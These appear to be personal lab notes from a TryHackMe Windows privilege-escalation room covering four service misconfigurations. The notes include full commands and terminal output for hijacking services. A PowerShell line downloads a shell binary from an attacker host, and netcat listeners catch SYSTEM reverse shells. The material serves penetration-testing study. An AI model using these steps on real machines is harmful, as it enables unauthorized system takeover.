Winprevsec 

POWERSHELL WEB REQUEST COMMAND 

powershell -c "InvokeWebRequest -Uri 'http://10.11.61.80:9000/shell.exe' -OutFile 'C:\PrivEsc\shell.exe'"


TITILE 			:                Service  exploits 


1: INSECURE SERVICE PERMISSIONS 




INTRODUCTION :

		Services configured to use an executable with weak permissions are vulnerable to privilege escalation attacks.
An unprivileged user could modify or overwrite the executable with arbitrary code,
which would be executed the next time the service is started.



Step 1 : QUERING 

The first step in the detection is to find a service with weak permissions, 
this can be done with the accesschk tool from Sysinternals,
which is available here."https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk


Use accesschk.exe to check the "user" account's permissions on the Services:

COMMAND TO RUN IS "accesschk.exe -uwcqv * "


This will show list each service and the groups which have write permissions to that service – 
if you have an account in any of these groups then you’ve potentially got privilege escalation. 
If the output of the above command is a little too much to dig through,
you could instead supply a group and it will limit output to services that group has write permission to, 
as:

accesschk.exe -uwcqv "Group Name" *
e.g.
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Everyone" *

RESULTS
"""
C:\PrivEsc>accesschk.exe -ucwqv "Everyone" *
accesschk.exe -ucwqv "Everyone" *
RW daclsvc
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_CHANGE_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_START
        SERVICE_STOP
        READ_CONTROL



"""


->The output will be the service name, the group name and the permissions that group has.
Anything like SERVICE_CHANGE_CONFIG or SERVICE_ALL_ACCESS is a win. 
In fact any of the following permissions are worth looking out for:

->UNUSUAL PERMISSIONS: (INSECURE)

daclsvc
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  RW Everyone
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_CHANGE_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_START
        SERVICE_STOP
        READ_CONTROL

->SHOULD BE : (SECURE)

daclsvc
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS


Note that the "user" account has the permission to change the service config (SERVICE_CHANGE_CONFIG).

Query the service and note that it runs with SYSTEM privileges (SERVICE_START_NAME):
COMMAND TO RUN --->  "sc qc daclsvc"

"""
C:\PrivEsc>sc qc daclsvc 
sc qc daclsvc 
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: daclsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\DACL Service\daclservice.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : DACL Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem


"""

EXPLOITATION:

-->Modify the service config and set the BINARY_PATH_NAME (binpath) to the reverse.exe executable you created:

sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""

Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:

net start daclsvc


If you have reconfiguration permissions, or can get them through the above permission list, then you can use the SC command to exploit the vulnerability:

sc config SERVICENAME binPath= "E:\Service.exe"
sc config SERVICENAME obj=".\LocalSystem" password=""
net stop SERVICENAME
net start SERVICENAME


if you have one payload make a second payload with diffrent lport to maintain 
the netcat of lower level and update the path to new one and start a listener

WHOLE PROCESS:

"""


┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/winprivesc]
└─$ nc -lvnp 5555
listening on [any] 5555 ...
connect to [10.11.61.80] from (UNKNOWN) [10.10.96.68] 49790
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\PrivEsc>accesschk.exe -ucwqv "Everyone" *
accesschk.exe -ucwqv "Everyone" *
RW daclsvc
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_CHANGE_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_START
        SERVICE_STOP
        READ_CONTROL

C:\PrivEsc>sc qc daclsvc
sc qc daclsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: daclsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\DACL Service\daclservice.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : DACL Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem

C:\PrivEsc>net stop daclsvc
net stop daclsvc
The DACL Service service is not started.

More help is available by typing NET HELPMSG 3521.


C:\PrivEsc>sc config daclsvc binpath= "\"C:\PrivEsc\shell2.exe\""
sc config daclsvc binpath= "\"C:\PrivEsc\shell2.exe\""
[SC] ChangeServiceConfig SUCCESS

C:\PrivEsc>net start daclsvc
net start daclsvc
The service is not responding to the control function.

More help is available by typing NET HELPMSG 2186.


C:\PrivEsc>

ROOT SIDE 


┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/winprivesc]
└─$ nc -lnvp 4444              
listening on [any] 4444 ...
connect to [10.11.61.80] from (UNKNOWN) [10.10.96.68] 49798
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>

C:\Windows\system32>whoami       
whoami
nt authority\system





""" 



SERVICE EXPLOIT 2 			:   			UNQUOTED PATH SERVICE 


INTRODUCTION:

Exploiting Unquoted Service path is one technique to increase privileges.

Unquoted Path or Unquoted Service path is reported as a critical vulnerability in Windows,
such vulnerability allows an attacker to escalate the privilege for NT AUTHORITY/SYSTEM for a low-level privilege user account.

Unquoted Service Path

If the path to the service binary is not enclosed in quotes and contains white spaces, 
the name of a loophole for an installed service is Service Unquoted Path. As a result, 
a local user will be able to elevate the privilege to administrator privilege shell by 
placing an executable in a higher level directory within the path.



STEP 1: Enumeration Winpeas 



"""
[+] UNQUOTED SERVICE PATHS                                                                                                                                            
   [i] When the path is not quoted (ex: C:\Program files\soft\new folder\exec.exe) Windows will try to execute first 'C:\Program.exe', then 'C:\Program Files\soft\new.exe' and finally 'C:\Program Files\soft\new folder\exec.exe'. Try to create 'C:\Program Files\soft\new.exe'                                                            
   [i] The permissions are also checked and filtered using icacls                                                                                                      
   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services                                                                                 
AWSLiteAgent                                                                                                                                                           
 C:\Program Files\Amazon\XenTools\LiteAgent.exe                                                                                                                        
Invalid parameter "Files\Amazon\XenTools\LiteAgent.exe"                                                                                                                
NetTcpPortSharing                                                                                                                                                      
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                                                                                                         
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe NT SERVICE\TrustedInstaller:(F)                                                                          
                                                                                                                                                                       
PerfHost                                                                                                                                                               
 C:\Windows\SysWow64\perfhost.exe                                                                                                                                      
C:\Windows\SysWow64\perfhost.exe NT SERVICE\TrustedInstaller:(F)                                                                                                       
                                                                                                                                                                       
PsShutdownSvc                                                                                                                                                          
 C:\Windows\PSSDNSVC.EXE                                                                                                                                               
C:\Windows\PSSDNSVC.EXE NT AUTHORITY\SYSTEM:(I)(F)                                                                                                                     
                                                                                                                                                                       
TrustedInstaller                                                                                                                                                       
 C:\Windows\servicing\TrustedInstaller.exe                                                                                                                             
C:\Windows\servicing\TrustedInstaller.exe NT SERVICE\TrustedInstaller:(F)                                                                                              
                                                                                                                                                                       
unquotedsvc                                                                                                                                                            
 C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe                                                                                           
Invalid parameter "Files\Unquoted"                                                                                                                                     
winexesvc                                                                                                                                                              
 winexesvc.exe                                                                                                                                                         
winexesvc.exe: The system cannot find the file specified.               

"""

THEN QUERY THE SERVICES TO SEE IF THEY HAVE ADMIN PRIV else iT will be lame to exploit them


--->COMMAND TO RUN 

"sc qc Service name"


 
RESULTS OF QUERYING :

"""

C:\PrivEsc>sc qc TrustedInstaller                                                                                                                                      
sc qc TrustedInstaller                                                                                                                                                 
[SC] QueryServiceConfig SUCCESS                                                                                                                                        
                                                                                                                                                                       
SERVICE_NAME: TrustedInstaller                                                                                                                                         
        TYPE               : 10  WIN32_OWN_PROCESS                                                                                                                     
        START_TYPE         : 3   DEMAND_START                                                                                                                          
        ERROR_CONTROL      : 1   NORMAL                                                                                                                                
        BINARY_PATH_NAME   : C:\Windows\servicing\TrustedInstaller.exe                                                                                                 
        LOAD_ORDER_GROUP   : ProfSvc_Group                                                                                                                             
        TAG                : 0                                                                                                                                         
        DISPLAY_NAME       : Windows Modules Installer                                                                                                                 
        DEPENDENCIES       :                                                                                                                                           
        SERVICE_START_NAME : localSystem                                                                                                                               
                                                                                                                                                                       
C:\PrivEsc>sc qc unquotedsvc                                                                                                                                           
sc qc unquotedsvc                                                                                                                                                      
[SC] QueryServiceConfig SUCCESS                                                                                                                                        
                                                                                                                                                                       
SERVICE_NAME: unquotedsvc                                                                                                                                              
        TYPE               : 10  WIN32_OWN_PROCESS                                                                                                                     
        START_TYPE         : 3   DEMAND_START                                                                                                                          
        ERROR_CONTROL      : 1   NORMAL                                                                                                                                
        BINARY_PATH_NAME   : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe                                                               
        LOAD_ORDER_GROUP   :                                                                                                                                           
        TAG                : 0                                                                                                                                         
        DISPLAY_NAME       : Unquoted Path Service                                                                                                                     
        DEPENDENCIES       :                                                                                                                                           
        SERVICE_START_NAME : LocalSystem                                                                                                                               
                                                                                                                                                                       
C:\PrivEsc>  


"""



NOTE :


LOOK FOR  
	1: BINARY_PATH_NAME = unquoted 
	2: SERVICE_START_NAME = LocalSystem  

CHECK FOR YOUR ACCOUNT PRIVS WETHER IT CAN MODIFY THE FILES IN THAT PATH OR NOT

USE COMMAND ------>>	accesschk.exe -uwqd "BIN_PATH_NAME" 


"""
C:\PrivEsc>C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Windows\servicing\" 
C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Windows\servicing\" 
C:\Windows\servicing
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT SERVICE\TrustedInstaller

C:\PrivEsc>C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\" 
C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\" 
C:\Program Files\Unquoted Path Service
  Medium Mandatory Level (Default) [No-Write-Up]
  RW BUILTIN\Users
  RW NT SERVICE\TrustedInstaller
  RW NT AUTHORITY\SYSTEM
  RW BUILTIN\Administrators




"""

  

EXPLOITATION:


COPY THE SHELL TO THE HIGHER LEVEL PATH OF THE binpath OF THE FILE :

stop the service 

COMMAND ---->  net stop servicename 

COMMAND --->  copy C:\PrivEsc\shell2.exe "C:\Program Files\Unquoted Path Service\Common.exe"

start a listner 

COMMAND --->  net start servicename 

VOILLAH :)) YOU HAVE ROOT SHELL


"""
:\PrivEsc>net stop unquotedsvc
net stop unquotedsvc                                                                                                                                                   
The Unquoted Path Service service is not started.                                                                                                                      
                                                                                                                                                                       
More help is available by typing NET HELPMSG 3521.                                                                                                                     
                                                                                                                                                                       

C:\PrivEsc>copy C:\PrivEsc\shell2.exe "C:\Program Files\Unquoted Path Service\Common.exe"
copy C:\PrivEsc\shell2.exe "C:\Program Files\Unquoted Path Service\Common.exe"
        1 file(s) copied.

C:\PrivEsc>net start unquotedsvc
net start unquotedsvc
The service is not responding to the control function.

More help is available by typing NET HELPMSG 2186.


C:\PrivEsc>


NETCAT LISTNER SIDE


┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/winprivesc]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.11.61.80] from (UNKNOWN) [10.10.105.81] 49804
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>


"""


SERVICE EXPLOIT 3 		:			WEAK RIGISTORY PERMISSION 


Introduction

Windows Registry

The registry is a system-defined database in which applications and system components store and retrieve configuration data. 
The registry is a hierarchical database that contains data that is critical for the operation of Windows and the applications 
and services that run on Windows.

You can use Registry Editor to do the following actions:

    Locate a subtree, key, subkey, or value
    Add a subkey or a value
    Change a value
    Delete a subkey or a value
    Rename a subkey or a value

The data is structured in a tree format. Each node in the tree is called a key. 
Each key can contain both subkeys and data entries called values.


Weak Registry Permission

By hijacking the Registry entries utilized by services, attackers can run their malicious payloads. 
Attackers may use weaknesses in registry permissions to divert from the initially stated executable 
to one they control upon Service start, allowing them to execute their unauthorized malware.





EXPLOITION:



Query the "regsvc" service and note that it runs with SYSTEM privileges (SERVICE_START_NAME).

sc qc regsvc

Using accesschk.exe, note that the registry entry for the regsvc service is writable by the "NT AUTHORITY\INTERACTIVE" group (essentially all logged-on users):

C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc

Overwrite the ImagePath registry key to point to the reverse.exe executable you created:

reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f

Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:

net start regsvc

"""
C:\PrivEsc>sc qc regsvc       
sc qc regsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: regsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Insecure Registry Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem

C:\PrivEsc>C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc                                                                              
HKLM\System\CurrentControlSet\Services\regsvc                                                                                                                          
  Medium Mandatory Level (Default) [No-Write-Up]                                                                                                                       
  RW NT AUTHORITY\SYSTEM                                                                                                                                               
        KEY_ALL_ACCESS                                                                                                                                                 
  RW BUILTIN\Administrators
        KEY_ALL_ACCESS
  RW NT AUTHORITY\INTERACTIVE
        KEY_ALL_ACCESS

C:\PrivEsc>reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\shell2.exe /f
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\shell2.exe /f
The operation completed successfully.

C:\PrivEsc>net start regsvc
net start regsvc

ON LISTNER SIDE 

┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/winprivesc]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.11.61.80] from (UNKNOWN) [10.10.166.201] 49835
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>

C:\Windows\system32>


"""



SERVICE EXPLOIT 4 			:		Insecure Service Executables



EXPLOITTION:



Query the "filepermsvc" service and note that it runs with SYSTEM privileges (SERVICE_START_NAME).

sc qc filepermsvc


"""

C:\PrivEsc>sc qc filepermsvc
sc qc filepermsvc                                                                                                                                                      
[SC] QueryServiceConfig SUCCESS                                                                                                                                        
                                                                                                                                                                       
SERVICE_NAME: filepermsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\File Permissions Service\filepermservice.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : File Permissions Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem



"""

STEP 2


Using accesschk.exe, note that the service binary (BINARY_PATH_NAME) file is writable by everyone:

C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"

"""

C:\PrivEsc>C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
C:\Program Files\File Permissions Service\filepermservice.exe
  Medium Mandatory Level (Default) [No-Write-Up]
  RW Everyone
        FILE_ALL_ACCESS
  RW NT AUTHORITY\SYSTEM
        FILE_ALL_ACCESS
  RW BUILTIN\Administrators
        FILE_ALL_ACCESS
  RW WIN-QBA94KB3IOF\Administrator
        FILE_ALL_ACCESS
  RW BUILTIN\Users
        FILE_ALL_ACCESS


"""


STEP 4

Copy the reverse.exe executable you created and replace the filepermservice.exe with it:

copy C:\PrivEsc\shell2.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y


"""

C:\PrivEsc>copy C:\PrivEsc\shell2.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
copy C:\PrivEsc\shell2.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
        1 file(s) copied.

"""

STEP 5:



Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:

net start filepermsvc

"""

C:\PrivEsc>net start filepermsvc
net start filepermsvc
The service is not responding to the control function.

More help is available by typing NET HELPMSG 2186.




ON LISTNER SIDE 


┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/winprivesc]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.11.61.80] from (UNKNOWN) [10.10.166.201] 49872
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>

"""



